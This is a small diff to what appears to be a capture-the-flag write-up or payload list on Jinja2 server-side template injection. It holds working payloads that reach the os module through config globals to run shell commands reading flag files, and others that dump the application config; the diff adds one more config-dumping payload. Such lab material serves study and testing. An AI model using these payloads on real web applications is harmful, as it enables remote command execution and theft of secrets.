@@ -38,6 +38,7 @@ Then inject the second payload : `{{config.from_object('os')}}
 {{config.__class__.__init__.__globals__['os'].popen('cat /home/ctf/flag.txt').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
 {{config}}
+{{config.items}}
 {%with a="Hello World"%}
 {%print(a)%}
 {%endwith}
